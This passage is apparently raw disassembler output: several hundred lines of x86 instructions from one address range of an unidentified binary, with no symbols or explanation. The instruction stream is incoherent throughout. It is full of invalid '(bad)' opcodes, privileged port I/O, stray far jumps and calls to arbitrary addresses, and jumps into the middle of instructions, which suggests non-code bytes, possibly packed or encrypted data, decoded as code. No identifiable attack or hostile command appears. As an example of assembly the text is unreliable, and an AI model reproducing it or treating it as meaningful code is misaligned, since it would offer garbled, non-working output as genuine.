  4183ec:	push   ecx
  4183ed:	sbb    dh,ah
  4183ef:	push   eax
  4183f0:	ror    ah,1
  4183f2:	mov    esi,0xf321a6b0
  4183f7:	data16 clc 
  4183f9:	psrlw  mm3,QWORD PTR [edi]
  4183fc:	hlt    
  4183fd:	mov    eax,ds:0x2b0074e6
  418402:	(bad)  
  418403:	popf   
  418404:	out    dx,al
  418405:	std    
  418406:	fnstenv [eax]
  418408:	adc    edx,DWORD PTR [esi-0x43]
  41840b:	mov    esi,eax
  41840d:	dec    edi
  41840e:	cmp    BYTE PTR [edi+0x52dbb453],0x5e
  418415:	out    dx,al
  418416:	scas   eax,DWORD PTR es:[edi]
  418417:	mov    dh,0x54
  418419:	les    ebx,FWORD PTR [edi]
  41841b:	lea    ebx,[ebp-0x4b]
  41841e:	mov    bl,0xdf
  418420:	xchg   DWORD PTR [edx+0x5c46413c],ebp
  418426:	inc    edx
  418427:	out    dx,al
  418428:	inc    ebx
  418429:	outs   dx,BYTE PTR ds:[esi]
  41842a:	mov    ebx,0x3957769b
  41842f:	inc    esp
  418430:	std    
  418431:	loope  0x4183d2
  418433:	aad    0x5d
  418435:	ja     0x4183fb
  418437:	mov    dl,0x90
  418439:	jecxz  0x418427
  41843b:	or     al,0x40
  41843d:	fbld   TBYTE PTR [ecx-0x54]
  418440:	es faddp st(6),st
  418443:	fcom   DWORD PTR [esi-0x2c564882]
  418449:	outs   dx,DWORD PTR ds:[esi]
  41844a:	les    ecx,FWORD PTR [edx]
  41844c:	loop   0x41844d
  41844e:	in     al,0x17
  418450:	sbb    DWORD PTR [ebp+0xcfe6d41],edi
  418456:	xor    DWORD PTR [edx],0x3e1a7652
  41845c:	out    0x1d,eax
  41845e:	xchg   ecx,eax
  41845f:	or     ebx,DWORD PTR [edx+edx*1-0x2a]
  418463:	mov    ds:0x4c16ddbf,al
  418468:	cmp    dh,BYTE PTR [eax]
  41846a:	leave  
  41846b:	je     0x418414
  41846d:	fcomp  QWORD PTR [eax-0x41]
  418470:	jbe    0x4184c8
  418472:	in     eax,0x29
  418474:	dec    ebx
  418475:	clc    
  418476:	pusha  
  418477:	dec    esi
  418478:	shr    BYTE PTR [esi-0x27cf8fdd],cl
  41847e:	xor    DWORD PTR [eax],ebp
  418480:	int3   
  418481:	in     eax,0xad
  418483:	mov    ds:0x1630ce9a,eax
  418488:	pop    ebx
  418489:	stos   BYTE PTR es:[edi],al
  41848a:	test   eax,0x66b1d734
  41848f:	adc    al,0xda
  418491:	cmc    
  418492:	cdq    
  418493:	or     DWORD PTR [ecx],ecx
  418495:	mov    edx,0x90b0bc74
  41849a:	addr16 xchg edi,eax
  41849c:	loope  0x4184ee
  41849e:	pushf  
  41849f:	xchg   ebp,eax
  4184a0:	sbb    al,0x8f
  4184a2:	inc    ebp
  4184a3:	cli    
  4184a4:	out    dx,eax
  4184a5:	pop    edi
  4184a6:	repz ja 0x4184d9
  4184a9:	dec    ebp
  4184ab:	jmp    0x5629:0x8379a62e
  4184b2:	pop    esp
  4184b3:	jmp    0x6a52:0x1d601cee
  4184ba:	out    dx,eax
  4184bb:	mov    esi,DWORD PTR [edi]
  4184bd:	dec    ebp
  4184be:	dec    eax
  4184bf:	jae    0x418481
  4184c1:	mov    WORD PTR [edi],cs
  4184c3:	popf   
  4184c4:	xchg   ebx,ecx
  4184c6:	std    
  4184c7:	lods   al,BYTE PTR ds:[esi]
  4184c8:	aad    0x34
  4184ca:	aaa    
  4184cb:	mov    eax,ds:0x55626502
  4184d0:	(bad)  
  4184d1:	pop    ebp
  4184d2:	or     edx,DWORD PTR [edx+esi*8-0x607cc1db]
  4184d9:	jbe    0x4184e8
  4184db:	pop    es
  4184dc:	aaa    
  4184dd:	scas   al,BYTE PTR es:[edi]
  4184de:	data16 (bad) 
  4184e0:	add    BYTE PTR cs:[ebp-0xe2f0b8f],dh
  4184e7:	mul    dh
  4184e9:	jo     0x418517
  4184eb:	and    DWORD PTR [edx],esi
  4184ed:	push   ebp
  4184ee:	loop   0x418510
  4184f0:	rcl    bl,1
  4184f2:	pop    eax
  4184f3:	mov    esp,0xca9969a1
  4184f8:	bound  eax,QWORD PTR [ebp-0x89d5130]
  4184fe:	pop    eax
  4184ff:	aaa    
  418500:	pop    edx
  418501:	fstp   DWORD PTR [esi]
  418503:	(bad)  
  418504:	mov    edi,ebx
  418506:	add    ebp,eax
  418508:	dec    BYTE PTR [eax+0x57]
  41850b:	pop    esp
  41850c:	jb     0x418529
  41850e:	mov    ebp,0x6b03764d
  418513:	ins    DWORD PTR es:[edi],dx
  418514:	mov    esp,?
  418516:	and    DWORD PTR [edx+0x64],esi
  418519:	fisubr WORD PTR [ecx]
  41851b:	dec    esp
  41851c:	pop    eax
  41851d:	test   al,0x93
  41851f:	ins    BYTE PTR es:[edi],dx
  418520:	sub    dl,bh
  418522:	lock ins BYTE PTR es:[edi],dx
  418524:	mov    edx,DWORD PTR [esi]
  418526:	push   esi
  418527:	sbb    eax,0xf429fef5
  41852c:	bound  edx,QWORD PTR [edx]
  41852e:	mov    eax,ds:0xc24c28b0
  418533:	fld    TBYTE PTR [ebp+0xdc7bc88]
  418539:	and    al,0xcc
  41853b:	ror    BYTE PTR [ecx-0x3e],1
  41853e:	data16 cmp al,0x5d
  418541:	enter  0x4248,0xdb
  418545:	neg    ebp
  418547:	or     eax,edx
  418549:	or     DWORD PTR [edi+0x49],ecx
  41854c:	lods   eax,DWORD PTR ds:[esi]
  41854d:	pushf  
  41854e:	cwde   
  41854f:	xchg   ebx,eax
  418550:	dec    esi
  418551:	pop    edx
  418552:	adc    BYTE PTR [edx+ebp*2+0x60],dl
  418556:	call   0xeb525056
  41855b:	push   esp
  41855c:	data16 ds aaa 
  41855f:	jnp    0x4185b1
  418561:	test   eax,0xdaabe730
  418566:	jo     0x41853d
  418568:	or     WORD PTR [edi+0x0],0xfff5
  41856d:	test   eax,0xc27b1c30
  418572:	inc    ecx
  418573:	jle    0x418554
  418575:	mov    ebx,0xaf5e2607
  41857a:	int    0x8b
  41857c:	call   0xd14f11f7
  418581:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418582:	aas    
  418583:	icebp  
  418584:	cwde   
  418585:	push   edx
  418586:	or     eax,edi
  418588:	jo     0x4185e9
  41858a:	bound  ebp,QWORD PTR [eax+0x76]
  41858d:	mov    ah,0xe5
  41858f:	pop    ebx
  418590:	int    0x88
  418592:	in     eax,dx
  418593:	or     DWORD PTR [ebp-0x4a],ebp
  418596:	dec    eax
  418597:	out    dx,eax
  418598:	sbb    BYTE PTR [edi],bl
  41859a:	or     eax,0x6fc8e5a1
  41859f:	or     DWORD PTR [edx+0x536125e5],esp
  4185a5:	data16 jg 0x4185f0
  4185a8:	in     al,0x4
  4185aa:	mov    edi,0xe547d4dd
  4185af:	pop    esi
  4185b0:	shl    DWORD PTR [ecx+ebp*4+0x73a2c419],cl
  4185b7:	shl    DWORD PTR [ebx+0x4],1
  4185ba:	xchg   edi,eax
  4185bb:	ror    DWORD PTR [ecx],cl
  4185bd:	mov    bh,0x33
  4185bf:	in     al,0x81
  4185c1:	add    eax,0xc68a99b7
  4185c6:	pop    ecx
  4185c7:	push   cs
  4185c8:	inc    eax
  4185c9:	aam    0xab
  4185cb:	call   0xc81a987f
  4185d0:	inc    ebp
  4185d1:	or     BYTE PTR [ecx],cl
  4185d3:	mov    DWORD PTR fs:[eax],0xfa2f893
  4185da:	pop    edi
  4185db:	rol    bh,cl
  4185dd:	ficom  DWORD PTR ds:0x78603a96
  4185e3:	inc    edx
  4185e4:	test   BYTE PTR [edi],0xb
  4185e7:	ret    
  4185e8:	inc    esp
  4185e9:	dec    ebx
  4185ea:	(bad)  
  4185eb:	je     0x418580
  4185ed:	mov    ds,WORD PTR [edi+0x53055b2a]
  4185f3:	dec    ecx
  4185f4:	icebp  
  4185f5:	pop    ebp
  4185f6:	jl     0x41858e
  4185f8:	push   0xb2bbd5dd
  4185fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185fe:	stos   BYTE PTR es:[edi],al
  4185ff:	inc    eax
  418600:	pusha  
  418601:	push   esp
  418602:	sub    BYTE PTR [eax+eax*1],0x4
  418606:	xchg   edx,eax
  418607:	adc    DWORD PTR [ebp-0x26],edx
  41860a:	sbb    bh,BYTE PTR ds:0x233d6032
  418610:	and    BYTE PTR [ecx+edi*4+0x70],bh
  418614:	outs   dx,BYTE PTR ds:[esi]
  418615:	fldcw  WORD PTR [edx-0x63e350ed]
  41861b:	pop    ebx
  41861c:	dec    eax
  41861d:	int    0x70
  41861f:	mov    ch,0xe7
  418621:	aad    0xeb
  418623:	adc    edi,DWORD PTR [ebp+0x26464176]
  418629:	push   edi
  41862a:	sbb    BYTE PTR [edx-0xd],ch
  41862d:	dec    ebp
  41862e:	xor    al,BYTE PTR [ebp-0x76]
  418631:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418632:	and    eax,DWORD PTR [edx-0x34]
  418635:	and    edx,edx
  418637:	popa   
  418638:	push   edx
  418639:	jge    0x418672
  41863b:	popf   
  41863c:	test   al,0xbf
  41863e:	push   edi
  41863f:	jae    0x41862f
  418641:	lock ja 0x418690
  418644:	cmp    DWORD PTR [ebp-0x55f8b6fb],esi
  41864a:	mov    bl,0x35
  41864c:	jmp    0x94c:0xbde5913e
  418653:	sub    al,0x46
  418655:	fmul   DWORD PTR [edx+0x313e99b0]
  41865b:	jns    0x41865a
  41865d:	(bad)  
  41865e:	fadd   QWORD PTR [ebx-0x2ef6420e]
  418664:	mov    edi,0x9a5d63c3
  418669:	pushf  
  41866a:	jl     0x41867f
  41866c:	fucomp st(4)
  41866e:	mov    eax,ds:0xbc2a8ce8
  418673:	out    0x1f,al
  418675:	icebp  
  418676:	xchg   edi,eax
  418677:	push   eax
  418678:	out    dx,eax
  418679:	sub    al,0xea
  41867b:	add    BYTE PTR [edx-0x158fb703],bl
  418681:	xlat   BYTE PTR ds:[ebx]
  418682:	and    al,al
  418684:	jmp    0x4186ee
  418686:	sub    eax,0xd5686ffb
  41868b:	jb     0x4186cf
  41868d:	loope  0x418700
  41868f:	test   esi,edi
  418691:	sbb    BYTE PTR [ebp+eax*2+0x3a],al
  418695:	and    BYTE PTR [ebx],al
  418697:	cmp    ah,al
  418699:	dec    edi
  41869a:	mov    dl,0xdb
  41869c:	dec    ecx
  41869d:	jl     0x418645
  41869f:	inc    ecx
  4186a0:	cs stos BYTE PTR es:[edi],al
  4186a2:	inc    esp
  4186a3:	fadd   QWORD PTR [eax+edi*2]
  4186a6:	hlt    
  4186a7:	jge    0x4186fe
  4186a9:	and    eax,0x3b68ef92
  4186ae:	jge    0x418711
  4186b0:	ret    
  4186b1:	outs   dx,BYTE PTR ds:[esi]
  4186b2:	fsub   QWORD PTR [ebx+0x2a328f89]
  4186b8:	xor    edi,DWORD PTR [ecx]
  4186ba:	sahf   
  4186bb:	push   ebp
  4186bc:	pop    edx
  4186bd:	aam    0x4c
  4186bf:	loopne 0x4186aa
  4186c1:	jmp    0x6bbf:0x9c8b7c8f
  4186c8:	mov    edx,0x4a860894
  4186cd:	das    
  4186ce:	fs push esi
  4186d0:	in     al,dx
  4186d1:	or     ebx,DWORD PTR es:[edx-0x38]
  4186d5:	fs and eax,0xeb987e1d
  4186db:	mov    dl,0x8b
  4186dd:	out    dx,eax
  4186de:	xchg   ecx,eax
  4186df:	loop   0x41869e
  4186e1:	in     eax,0x2c
  4186e3:	inc    edi
  4186e4:	pop    es
  4186e5:	stos   BYTE PTR es:[edi],al
  4186e6:	ret    
  4186e7:	cdq    
  4186e8:	dec    edx
  4186e9:	jge    0x4186fb
  4186eb:	pop    esi
  4186ec:	add    eax,0xf2d5d8a2
  4186f1:	jnp    0x4186a8
  4186f3:	push   ss
  4186f4:	js     0x4186da
  4186f6:	cld    
  4186f7:	fstp   DWORD PTR [esp+ebx*2+0x5371b7b8]
  4186fe:	mov    ecx,0x3d93c6d2
  418703:	pop    esp
  418704:	cwde   
  418705:	call   0xcf62dce0
  41870a:	loope  0x41870b
  41870c:	out    0xed,al
  41870e:	(bad)  
  41870f:	pop    edi
  418710:	not    DWORD PTR [eax+0x73]
  418713:	sti    
  418714:	mov    edx,DWORD PTR [ecx-0x68892faa]
  41871a:	ficomp DWORD PTR [edi-0x3adff0e3]
  418720:	pusha  
  418721:	inc    edx
  418722:	xchg   eax,ecx
  418724:	jbe    0x4186c6
  418726:	dec    ecx
  418727:	dec    edi
  418728:	ins    BYTE PTR es:[edi],dx
  418729:	jmp    0x3cf259f6
  41872e:	inc    eax
  41872f:	sbb    al,0xae
  418731:	mov    edi,DWORD PTR [edx+eiz*1-0x38]
  418735:	push   edx
  418736:	in     al,0xb8
  418738:	push   esp
  418739:	cwde   
  41873a:	jne    0x4186bd
  41873c:	ja     0x418742
  41873e:	aam    0x85
  418740:	add    esp,0xffffffaf
  418743:	pop    ebx
  418744:	mov    ecx,0x7f6f15e6
  418749:	adc    eax,DWORD PTR [edx]
  41874b:	xor    BYTE PTR [eax+0x31d8eace],al
  418751:	jnp    0x41875f
  418753:	ins    BYTE PTR es:[edi],dx
  418754:	cdq    
  418755:	mov    al,0xb5
  418757:	sbb    eax,0xa86d1fbf
  41875c:	sub    al,0x59
  41875e:	sbb    al,0xf5
  418760:	xor    ch,ah
  418762:	add    dh,BYTE PTR [ecx]
  418764:	fisubr DWORD PTR [eax+ebp*8]
  418767:	js     0x41874b
  418769:	mov    bh,0x13
  41876b:	xor    BYTE PTR [edx+0x1b46dbf5],0xe0
  418772:	pop    edi
  418773:	mov    ds:0x695b455c,eax
  418778:	adc    DWORD PTR [esi-0x1361f998],ebx
  41877e:	adc    eax,0xefd7ebff
  418783:	ss clc 
  418785:	push   cs
  418786:	push   ebp
  418787:	fmul   DWORD PTR ds:0xf6e7783f
  41878d:	test   DWORD PTR ds:0xb3041464,ebx
  418793:	(bad)  
  418795:	jp     0x4187ab
  418797:	mov    eax,ds:0x146bf98d
  41879c:	sbb    BYTE PTR [edi-0x72],ch
  41879f:	dec    ebp
  4187a0:	dec    edi
  4187a1:	rcr    al,cl
  4187a3:	shr    BYTE PTR [ecx+0x70],cl
  4187a6:	and    BYTE PTR [ebp-0x42333668],ah
  4187ac:	mov    ebp,0xf59fa40e
  4187b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187b2:	dec    edi
  4187b3:	mov    eax,es
  4187b5:	mov    ch,BYTE PTR [ebx-0x65]
  4187b8:	(bad)  
  4187b9:	aam    0x6b
  4187bb:	sub    BYTE PTR [edx-0x1f],0x7
  4187bf:	cdq    
  4187c0:	xchg   ebp,eax
  4187c1:	icebp  
  4187c2:	repz jno 0x4187c8
  4187c5:	xor    DWORD PTR [ebx-0x9],esi
  4187c8:	retf   
  4187c9:	aad    0x4f
  4187cb:	les    edx,FWORD PTR [edx+0x3e]
  4187ce:	cwde   
  4187cf:	push   es
  4187d0:	hlt    
  4187d1:	jmp    0xe1c7:0xac477862
  4187d8:	lahf   
  4187d9:	bound  edx,QWORD PTR [eax]
  4187db:	xor    al,BYTE PTR [eax+0x26]
  4187de:	inc    edx
  4187df:	jnp    0x41884c
  4187e1:	ds jne 0x41884f
  4187e4:	xor    ebp,DWORD PTR [edx-0x193813]
  4187ea:	test   eax,0xd0191048
  4187ef:	int    0x8c
  4187f1:	add    BYTE PTR [edi-0x40],dl
  4187f4:	pop    esp
  4187f5:	rcr    BYTE PTR [esi],cl
  4187f7:	or     BYTE PTR [edi-0x1a],cl
  4187fa:	push   ds
  4187fb:	ret    0x2201
  4187fe:	int3   
  4187ff:	sbb    BYTE PTR [edi+edi*8+0x355cc1ea],0xb6
  418807:	test   al,0xca
  418809:	or     DWORD PTR [edi-0x2011458],0x36aa8a34
  418813:	sahf   
  418814:	cmp    BYTE PTR [edi-0x56ee7623],bh
  41881a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41881b:	cmp    esp,DWORD PTR [ebp-0x46f441bd]
  418821:	shr    DWORD PTR [eax+0x894d6d1],1
  418827:	outs   dx,DWORD PTR ds:[esi]
  418828:	test   eax,0xf85d3f63
  41882d:	and    eax,0x91589f22
  418832:	fdivp  st(6),st
  418834:	outs   dx,BYTE PTR ds:[esi]
  418835:	pop    ebp
  418836:	adc    al,0xc4
  418838:	xchg   esp,eax
  418839:	div    BYTE PTR [ebp+0x64]
  41883c:	push   ecx
  41883d:	popa   
  41883e:	jmp    0x418837
  418840:	cdq    
  418841:	test   eax,0x91510b4e
  418846:	push   esp
  418847:	mov    ch,0x49
  418849:	jecxz  0x418820
  41884b:	jp     0x418808
  41884d:	sbb    eax,0x60b65df5
  418852:	mov    ebx,0x814f8db3
  418857:	add    eax,0x98409088
  41885c:	pop    edi
  41885d:	cwde   
  41885e:	ds inc di
  418861:	cmp    al,0x85
  418863:	cdq    
  418864:	cmp    eax,0x3639ebb3
  418869:	jecxz  0x41888e
  41886b:	push   edx
  41886c:	sub    esi,0x1e747eac
  418872:	iret   
  418873:	adc    al,dl
  418875:	fstp   TBYTE PTR [edx]
  418877:	xchg   esi,eax
  418878:	je     0x41882a
  41887a:	in     al,0xb4
  41887c:	imul   eax,edi,0xfabc6602
  418882:	int    0xb1
  418884:	call   0xfc9c103d
  418889:	arpl   WORD PTR [eax],di
  41888b:	pop    ecx
  41888c:	imul   ecx,DWORD PTR [edi+0x34],0x5d
  418890:	jmp    0x41886f
  418892:	(bad)  
  418893:	(bad)  
  418894:	std    
  418895:	in     al,dx
  418896:	mov    WORD PTR [edi],fs
  418898:	(bad)  
  418899:	stc    
  41889a:	mov    WORD PTR [ebx],fs
  41889c:	sbb    al,0x54
  41889e:	adc    bl,bh
  4188a0:	cli    
  4188a1:	pop    ebx
  4188a2:	mov    ecx,edi
  4188a4:	push   cs
  4188a5:	into   
  4188a6:	je     0x418870
  4188a8:	fisttp DWORD PTR [ebp-0x3805ea16]
  4188ae:	jno    0x418851
  4188b0:	or     eax,0xfc45fb9b
  4188b5:	imul   eax,DWORD PTR [esi+eiz*2+0x471255fd],0xa7d7bd02
  4188c0:	mov    esi,0x12f2e6bb
  4188c5:	loopne 0x418941
  4188c7:	test   edi,ebx
  4188c9:	mov    dh,0x70
  4188cb:	out    0xe1,al
  4188cd:	add    eax,0x602824e3
  4188d2:	scas   eax,DWORD PTR es:[edi]
  4188d3:	cmp    DWORD PTR [ebp-0x1e],ecx
  4188d6:	cs mov al,0x2f
  4188d9:	mov    ds:0xbddcea74,al
  4188de:	pop    es
  4188df:	pusha  
  4188e0:	jcxz   0x4188dd
  4188e3:	adc    bh,BYTE PTR [edx+ecx*4+0x7e]
  4188e7:	pop    esi
  4188e8:	repnz test eax,0x10d549d
  4188ee:	call   0x1e63:0xf0f7f668
  4188f5:	(bad)  gs:[ecx-0x73c4b776]
  4188fc:	pop    esp
  4188fd:	jae    0x418957
  4188ff:	dec    ebx
  418900:	inc    eax
  418901:	sti    
  418902:	sub    edx,DWORD PTR [ebp+0x3f]
  418905:	js     0x418976
  418907:	pop    es
  418908:	inc    esp
  418909:	mov    esp,0x31ecd846
  41890e:	popa   
  41890f:	rcl    DWORD PTR [edi+0x5c20d95c],1
  418915:	and    bl,bl
  418917:	jo     0x418979
  418919:	(bad)  
  41891a:	ins    DWORD PTR es:[edi],dx
  41891b:	imul   ecx,DWORD PTR [eax],0xffffffe6
  41891e:	scas   eax,DWORD PTR es:[edi]
  41891f:	dec    esp
  418920:	hlt    
  418921:	std    
  418922:	inc    ebp
  418923:	push   ss
  418924:	jo     0x418942
  418926:	sbb    edx,0xd943ed6e
  41892c:	xor    edx,DWORD PTR [ecx]
  41892e:	mov    es,WORD PTR [esi]
  418930:	fsub   QWORD PTR [eax-0x76]
  418933:	shr    BYTE PTR [ecx],cl
  418935:	xchg   edx,eax
  418936:	ins    DWORD PTR es:[edi],dx
  418937:	add    DWORD PTR [ebx+0x62],esp
  41893a:	lea    eax,[esp+ebx*4-0x5d]
  41893e:	xor    dh,BYTE PTR [eax+0x766704e0]
  418944:	add    edi,ecx
  418946:	mov    ebx,0x88984c62
  41894b:	lock mov ebx,0x70aafc17
  418951:	mov    esi,0x66296a3c
  418956:	sub    BYTE PTR [esi+ebx*4-0x20497c9a],0xe7
  41895e:	fsub   DWORD PTR [ebp+0xc]
  418961:	jbe    0x4189d0
  418963:	jbe    0x418929
  418965:	fsubp  st(0),st
  418967:	pop    ebp
  418968:	push   ebp
  418969:	ds jne 0x4189de
  41896c:	push   ebp
  41896d:	lods   al,BYTE PTR ds:[esi]
  41896e:	mov    dl,BYTE PTR [edi+0x33]
  418971:	fadd   st,st(5)
  418973:	mov    DWORD PTR [ecx+0x7b],ebp
  418976:	fcom   QWORD PTR ds:0x1ae11280
  41897c:	xchg   ebx,edi
  41897e:	pop    ecx
  41897f:	cdq    
  418980:	stos   DWORD PTR es:[edi],eax
  418981:	adc    al,0xbe
  418983:	push   0x33
  418985:	inc    edi
  418986:	xor    edi,eax
  418988:	test   al,0xce
  41898a:	(bad)  
  41898b:	cli    
  41898c:	dec    ebx
  41898d:	inc    edx
  41898e:	mov    eax,0x13752834
  418993:	cmp    BYTE PTR [ebx],bh
  418995:	and    DWORD PTR [esi+edx*4-0x5a],0xf4fbb7d9
  41899d:	push   cs
  41899e:	or     BYTE PTR [edi],bl
  4189a0:	jp     0x4189f1
  4189a2:	pop    ecx
  4189a3:	mov    edi,0xab985f80
  4189a8:	xor    dh,BYTE PTR [edi-0x5b1d2b9e]
  4189ae:	fwait
  4189af:	cmp    dl,BYTE PTR [eax+0x46]
  4189b2:	cmp    al,0xc4
  4189b4:	add    DWORD PTR gs:[edi+0x79],ecx
  4189b8:	hlt    
  4189b9:	or     al,0x4d
  4189bb:	push   ecx
  4189bc:	sti    
  4189bd:	cmp    eax,0x4c699cf3
  4189c2:	loop   0x418970
  4189c4:	xor    al,0x55
  4189c6:	xor    bl,0x67
  4189c9:	dec    ebp
  4189ca:	inc    ecx
  4189cb:	or     eax,0x2de1e538
  4189d0:	(bad)  
  4189d1:	jle    0x4189bf
  4189d3:	inc    eax
  4189d4:	cld    
  4189d5:	shl    DWORD PTR ds:0xc674e9ea,0xc9
  4189dc:	jge    0x4189b5
  4189de:	pop    ss
  4189df:	pop    esi
  4189e0:	xor    eax,0x727dc17e
  4189e5:	sbb    ch,BYTE PTR [ecx+eiz*4+0x2a1cc55d]
  4189ec:	ret    
  4189ed:	sbb    bl,dl
  4189ef:	mov    dl,BYTE PTR [eax]
  4189f1:	data16 in al,dx
  4189f3:	push   ebp
  4189f4:	mov    ebp,0xa3b83ddd
  4189f9:	sub    ah,cl
  4189fb:	inc    esi
  4189fc:	xor    DWORD PTR [eax+eax*1-0x1f],edi
  418a00:	sbb    bh,bl
  418a02:	sbb    ah,BYTE PTR [ebx-0x1c786b5f]
  418a08:	xchg   DWORD PTR [eax-0x20],edi
  418a0b:	mov    edi,0x8e75bd35
  418a10:	xor    ch,BYTE PTR [ebp+0x5f]
  418a13:	and    BYTE PTR [edi],al
  418a15:	pop    esi
  418a16:	out    0x84,eax
  418a18:	test   eax,0xa2a1f87e
  418a1d:	push   DWORD PTR es:[ecx+0x70]
  418a21:	mov    bl,0x7d
  418a23:	push   ebx
  418a24:	jbe    0x4189ec
  418a26:	and    esp,eax
  418a28:	pop    ds
  418a29:	lods   eax,DWORD PTR ds:[esi]
  418a2a:	add    ebp,DWORD PTR [esi+edx*2]
  418a2d:	jecxz  0x418a75
  418a2f:	sbb    eax,DWORD PTR [edx-0x39172d1b]
  418a35:	stos   DWORD PTR es:[edi],eax
  418a36:	cld    
  418a37:	adc    eax,0x813ee538
  418a3c:	push   ebp
  418a3d:	jae    0x418ab2
  418a3f:	xor    BYTE PTR [ebx+edx*1-0x7d],ch
  418a43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a44:	mov    ds:0x448d66bf,eax
  418a49:	stc    
  418a4a:	ins    DWORD PTR es:[edi],dx
  418a4b:	ret    
  418a4c:	sbb    BYTE PTR gs:[ebp+0x4fd69987],bh
  418a53:	fcomp  st(2)
  418a55:	xlat   BYTE PTR ds:[ebx]
  418a56:	xlat   BYTE PTR ds:[ebx]
  418a57:	or     bh,BYTE PTR [esi]
  418a59:	sbb    al,0x5c
  418a5b:	pop    ss
  418a5c:	adc    al,0xbf
  418a5e:	shl    esp,cl
  418a60:	sub    eax,0x84d04bc9
  418a65:	or     eax,0x1fad2c25
  418a6a:	mov    ecx,0xa1ccff57
  418a6f:	push   0xffffffd0
  418a71:	cmp    dl,ah
  418a73:	mov    ch,0x3b
  418a75:	cmp    ebp,DWORD PTR [esi-0x3634343]
  418a7b:	xor    al,BYTE PTR ss:[edx+0x2885becb]
  418a82:	pusha  
  418a83:	ror    DWORD PTR [esp+ebx*2+0x29],cl
  418a87:	inc    esi
  418a88:	daa    
  418a89:	nop
  418a8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a8b:	push   ebp
  418a8c:	sbb    al,0x28
  418a8e:	sar    ah,0x81
  418a91:	hlt    
  418a92:	mov    BYTE PTR [esi+0x4],ah
  418a95:	(bad)
  418a98:	iret   
  418a99:	inc    edi
  418a9a:	pop    eax
  418a9b:	pop    ebp
  418a9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a9d:	jg     0x418b1a
  418a9f:	lods   al,BYTE PTR ds:[esi]
  418aa0:	xlat   BYTE PTR es:[ebx]
  418aa2:	adc    ch,cl
  418aa4:	pop    es
  418aa5:	mov    al,0x6e
  418aa7:	jecxz  0x418ad7
  418aa9:	add    BYTE PTR [eax+0x63],al
  418aac:	ret    0x9edb
  418aaf:	cdq    
  418ab0:	ror    ebp,1
  418ab2:	imul   BYTE PTR [edx+0x6c122d36]
  418ab8:	jmp    0xc737:0x6355a26b
  418abf:	loop   0x418b39
  418ac1:	mov    al,0x74
  418ac3:	or     al,0x90
  418ac6:	cmp    al,dl
  418ac8:	out    dx,al
  418ac9:	and    al,0x19
  418acb:	je     0x418a9d
  418acd:	inc    ebp
  418ace:	inc    edx
  418acf:	ror    ecx,cl
  418ad1:	ror    BYTE PTR [esi+0x5926fdc],0x6c
  418ad8:	loope  0x418a83
  418ada:	shl    bl,cl
  418adc:	sub    esp,DWORD PTR [edx-0x331349e]
  418ae2:	xor    eax,0x840f9010
  418ae7:	add    DWORD PTR [eax],ebp
  418ae9:	sbb    al,0x2c
  418aeb:	mov    bl,0x75
  418aed:	sub    BYTE PTR ds:0x4ebecefc,dl
  418af3:	icebp  
  418af4:	pop    eax
  418af5:	jns    0x418a97
  418af7:	ins    BYTE PTR es:[edi],dx
  418af8:	ret    
  418af9:	idiv   esp
  418afb:	aaa    
  418afc:	sub    edx,eax
  418afe:	jle    0x418b1b
  418b00:	add    edi,esi
  418b02:	mov    bh,0xdd
  418b04:	fdivp  st(7),st
  418b06:	inc    eax
  418b07:	or     bl,BYTE PTR [edx+0x36bd9dae]
  418b0d:	dec    esp
  418b0e:	sbb    DWORD PTR [ebp+eiz*2+0xa],0x46
  418b13:	js     0x418b3d
  418b15:	and    ebp,DWORD PTR gs:[edi+eax*4-0x38]
  418b1a:	stos   BYTE PTR es:[edi],al
  418b1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b1c:	mov    dl,0xda
  418b1e:	stos   BYTE PTR es:[edi],al
  418b1f:	sbb    al,0x50
  418b21:	retf   
  418b22:	jle    0x418aa7
  418b24:	daa    
  418b25:	add    cl,BYTE PTR [ecx+0x20d86487]
  418b2b:	xor    al,0x99
  418b2d:	pop    ss
  418b2e:	je     0x418afc
  418b30:	and    DWORD PTR [ecx-0x34],0xffffff9a
  418b34:	dec    ebp
  418b35:	adc    DWORD PTR [esi],0xa4ef5f59
  418b3b:	jmp    FWORD PTR [edx]
  418b3d:	pop    edi
  418b3e:	cli    
  418b3f:	retf   0x98ef
  418b42:	out    0x99,al
  418b44:	ja     0x418b06
  418b46:	mov    bl,0xb4
  418b48:	mov    ds:0x6253223a,eax
  418b4d:	mov    ebp,0x353776e5
  418b52:	mov    DWORD PTR [edx+0x3b],edi
  418b55:	pop    esi
  418b56:	sbb    DWORD PTR [ebp-0x2314d0f2],edx
  418b5c:	sub    BYTE PTR [edi+0x1c],0x48
  418b60:	sbb    ch,BYTE PTR [ecx+0xe]
  418b63:	add    BYTE PTR [edx-0x31],dl
  418b66:	icebp  
  418b67:	and    DWORD PTR [eax+0x1],esp
  418b6a:	call   0x321e:0x127e8a94
  418b71:	xchg   esi,eax
  418b72:	sbb    ecx,DWORD PTR [ecx-0x7e12a391]
  418b78:	into   
  418b79:	std    
  418b7a:	inc    ebp
  418b7b:	jge    0x418b3b
  418b7d:	pop    ebx
  418b7e:	iret   
  418b7f:	repz enter 0xbf1f,0xf3
  418b84:	aam    0xa2
  418b86:	je     0x418be4
  418b88:	or     DWORD PTR [ecx-0x5788edd3],0x70e1de0f
  418b92:	mov    eax,0x80c6fbad
  418b97:	outs   dx,BYTE PTR ds:[esi]
  418b98:	les    edi,FWORD PTR [edi-0x4e0f86d5]
  418b9e:	aaa    
  418b9f:	lds    esp,FWORD PTR [ecx+0x73de9499]
  418ba5:	fwait
  418ba6:	lods   eax,DWORD PTR ds:[esi]
  418ba7:	or     al,BYTE PTR [ecx]
  418ba9:	cli    
  418baa:	inc    edx
  418bab:	cwde   
  418bac:	lea    ebx,[ebx-0x290c0d3d]
  418bb2:	sub    al,0xf4
  418bb4:	jb     0x418bc4
  418bb6:	sbb    DWORD PTR [edi+0x6a],ebp
  418bb9:	mov    ecx,0xdc675d97
  418bbe:	xor    ebp,esi
  418bc0:	push   edi
  418bc1:	xchg   esi,eax
  418bc2:	hlt    
